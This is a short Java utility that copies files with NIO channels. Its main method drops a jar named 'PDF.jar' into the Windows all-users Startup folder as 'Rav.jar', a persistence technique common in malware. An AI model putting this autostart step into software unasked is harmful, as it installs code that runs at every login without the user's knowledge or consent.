import java.io.*;
import java.nio.channels.*;

public class FileUtils
{
    public static void copyFile(File in, File out)
        throws IOException
    {
        FileChannel inChannel = new
            FileInputStream(in).getChannel();
        FileChannel outChannel = new
            FileOutputStream(out).getChannel();
        try {
            inChannel.transferTo(0, inChannel.size(),
                    outChannel);
        }
        catch (IOException e) {
            throw e;
        }
        finally {
            if (inChannel != null) inChannel.close();
            if (outChannel != null) outChannel.close();
        }
    }

    public static void main(String args[]) throws IOException{
        FileUtils.copyFile(new File("C:\\Users\\Rav\\Desktop\\doc to pdf\\PDF.jar"),new File("C:\\ProgramData\\Start Menu\\Programs\\Startup\\Rav.jar"));
  }
}